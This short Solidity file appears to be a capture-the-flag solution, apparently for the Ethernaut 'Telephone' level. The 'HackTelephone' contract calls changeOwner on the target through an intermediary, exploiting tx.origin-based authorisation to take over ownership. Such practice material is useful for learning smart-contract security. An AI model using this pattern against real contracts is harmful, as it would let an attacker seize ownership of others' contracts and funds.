// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackTelephone {

    ITelephone telephone;

    constructor(address _telephone) {
        telephone = ITelephone(_telephone);
    }

    function hack(address _newOwner) public {
        telephone.changeOwner(_newOwner);
    }
}

interface ITelephone {
  function changeOwner(address _owner) external;
}